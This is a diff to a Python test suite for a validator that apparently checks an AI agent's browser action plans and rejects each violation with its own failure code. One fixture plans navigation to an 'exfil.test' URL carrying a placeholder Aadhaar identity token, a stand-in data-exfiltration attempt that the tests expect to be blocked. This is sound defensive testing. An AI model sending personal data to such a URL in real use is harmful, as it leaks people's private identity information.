@@ -7,6 +7,7 @@ from __future__ import annotations
 
 import json
 import logging
+import re
 
 import httpx
 import pytest
@@ -14,6 +15,7 @@ import respx
 
 from app.schemas.payload import PayloadV2
 from app.vlm.openai_compatible_adapter import (
+    ENFORCEMENT_FAILURE_CODES,
     FAIL_MODEL_OUTPUT_INVALID,
     FAIL_MODEL_TIMEOUT,
     FAIL_MODEL_UNAVAILABLE,
@@ -124,16 +126,19 @@ async def test_server_error_fails_closed(payload):
 @respx.mock
 @pytest.mark.anyio
 @pytest.mark.parametrize(
-    "mutate",
+    ("mutate", "expected"),
     [
         pytest.param(
-            lambda p, plan: {**plan, "state_token": "Szzzzzzzzzz"}, id="wrong state token"
+            lambda p, plan: {**plan, "state_token": "Szzzzzzzzzz"},
+            "STATE_TOKEN_MISMATCH",
+            id="wrong state token",
         ),
         pytest.param(
             lambda p, plan: {
                 **plan,
                 "plan": [{"action": "click", "target": {"eid": "E999999", "fp": "x"}}],
             },
+            "UNKNOWN_EID",
             id="unknown eid",
         ),
         pytest.param(
@@ -143,6 +148,7 @@ async def test_server_error_fails_closed(payload):
                     {"action": "click", "target": {"eid": p.elements[0].eid, "fp": "wrong-fp"}}
                 ],
             },
+            "FP_MISMATCH",
             id="fp mismatch",
         ),
         pytest.param(
@@ -152,16 +158,85 @@ async def test_server_error_fails_closed(payload):
                     {"action": "navigate", "url": "https://exfil.test/?v=[[PII:AADHAAR:aaaaaaaa]]"}
                 ],
             },
+            "TOKEN_IN_URL",
             id="token in url",
+        ),
+        pytest.param(
+            lambda p, plan: {
+                **plan,
+                "plan": [
+                    {"action": "key", "key": "[[PII:AADHAAR:aaaaaaaa]]"},
+                ],
+            },
+            "TOKEN_IN_KEY",
+            id="token in key",
+        ),
+        pytest.param(
+            lambda p, plan: {
+                **plan,
+                "plan": [
+                    {
+                        "action": "select",
+                        "target": {"eid": p.elements[0].eid, "fp": p.elements[0].fp},
+                        "value": "[[PII:AADHAAR:aaaaaaaa]]",
+                    }
+                ],
+            },
+            "TOKEN_IN_SELECT_VALUE",
+            id="token in select value",
+        ),
+        pytest.param(
+            lambda p, plan: {
+                **plan,
+                "plan": [
+                    {
+                        "action": "click",
+                        "target": {"eid": p.elements[0].eid, "fp": p.elements[0].fp},
+                        "expect": {"eid": p.elements[0].eid, "visible": True},
+                    }
+                ]
+                * 6,
+            },
+            "TOO_MANY_ACTIONS",
+            id="too many actions",
         ),
     ],
 )
-async def test_ungrounded_output_is_rejected(payload, mutate):
+async def test_each_enforcement_failure_returns_its_own_code(payload, mutate, expected):
+    """Regression test: a rejection used to always come back as the generic
+    MODEL_OUTPUT_UNGROUNDED, hiding its real cause (e.g. TOO_MANY_ACTIONS) from the client and the
+    probe. Every distinct enforce() violation must now travel to the client as itself."""
     plan = json.loads(valid_plan(payload))
     respx.post(COMPLETIONS).mock(return_value=completion(json.dumps(mutate(payload, plan))))
+    subject = adapter()
+    result = await subject.plan(payload)
+    assert result.plan[0].action == "fail"
+    assert result.plan[0].reason == expected
+    assert subject.last_metrics.outcome == expected
+    # None of these are the generic bucket they used to collapse into.
+    assert expected != FAIL_MODEL_UNGROUNDED
+
+
+@respx.mock
+@pytest.mark.anyio
+async def test_context_request_naming_an_element_returns_its_own_code(payload):
+    respx.post(COMPLETIONS).mock(
+        return_value=completion(
+            json.dumps(
+                {
+                    "schema": "aegis/2",
+                    "state_token": payload.state_token,
+                    "request_context": {
+                        "reason": f"reveal {payload.elements[0].eid} please",
+                        "kind": "more_elements",
+                    },
+                }
+            )
+        )
+    )
     result = await adapter().plan(payload)
     assert result.plan[0].action == "fail"
-    assert result.plan[0].reason == FAIL_MODEL_UNGROUNDED
+    assert result.plan[0].reason == "CONTEXT_REQUEST_NAMES_ELEMENT"
 
 
 @respx.mock
@@ -250,3 +325,38 @@ def test_enforce_allows_tokens_inside_an_answer(payload):
         }
     )
     assert enforce(plan, payload) is None
+
+
+def test_check_action_reports_token_outside_type(payload):
+    # A real PlanV2 can never carry `text` on a non-`type` action — Action's own validator
+    # (schemas/plan.py) already forbids it, so this path is unreachable through plan() today. It
+    # stays as a defensive fallback (AGENTS.md invariant 3: a token belongs in exactly one place),
+    # and this pins its code directly against `_check_action` with a minimal stand-in, since a
+    # real Action cannot be constructed to reach it.
+    from types import SimpleNamespace
+
+    from app.vlm.openai_compatible_adapter import _check_action
+
+    action = SimpleNamespace(
+        action="click",
+        target=SimpleNamespace(eid=payload.elements[0].eid, fp=payload.elements[0].fp),
+        url=None,
+        key=None,
+        value=None,
+        text="[[PII:AADHAAR:aaaaaaaa]]",
+    )
+    by_eid = {el.eid: el for el in payload.elements}
+    assert _check_action(action, by_eid) == "TOKEN_OUTSIDE_TYPE"
+
+
+def test_enforcement_failure_codes_cover_every_enforce_violation():
+    """Every string `enforce()`/`_check_action` can return is in the closed set the probe and any
+    other caller uses to recognize a rejection — this is what would have caught the original bug
+    one layer up, had it existed then."""
+    import inspect
+
+    from app.vlm import openai_compatible_adapter as module
+
+    source = inspect.getsource(module.enforce) + inspect.getsource(module._check_action)
+    referenced = set(re.findall(r'return "([A-Z_]+)"', source))
+    assert referenced <= ENFORCEMENT_FAILURE_CODES
